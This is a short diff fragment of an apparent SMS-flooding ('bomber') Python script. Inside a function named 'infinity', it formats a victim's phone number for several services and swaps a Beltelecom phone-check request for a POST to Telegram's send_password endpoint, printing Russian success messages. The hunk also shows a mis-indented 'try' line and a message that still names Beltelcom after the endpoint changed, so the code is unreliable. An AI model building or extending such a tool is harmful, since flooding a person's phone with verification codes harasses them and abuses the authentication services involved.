@@ -36,8 +36,8 @@ def infinity():
 		_phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11]
 		_phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
 		
-		try:
-			requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
+	try:
+			requests.post('https://my.telegram.org/auth/send_password', data={'phone': _phone})
 			print('[+] Beltelcom отправлено!')
 		except:
 			print('[-] Не отправлено!')
